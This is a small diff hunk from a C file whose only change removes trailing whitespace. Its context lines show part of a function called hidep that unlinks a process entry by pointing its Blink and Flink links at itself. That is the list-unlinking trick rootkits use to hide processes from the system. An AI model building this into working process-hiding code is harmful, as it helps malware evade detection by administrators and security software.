@@ -22,7 +22,7 @@ PCHAR hidep(UINT32 pid) {
 		currentList->Blink = currentList;
 		currentList->Flink = currentList;
 	}
-	
+
 	return NULL;
 }
 
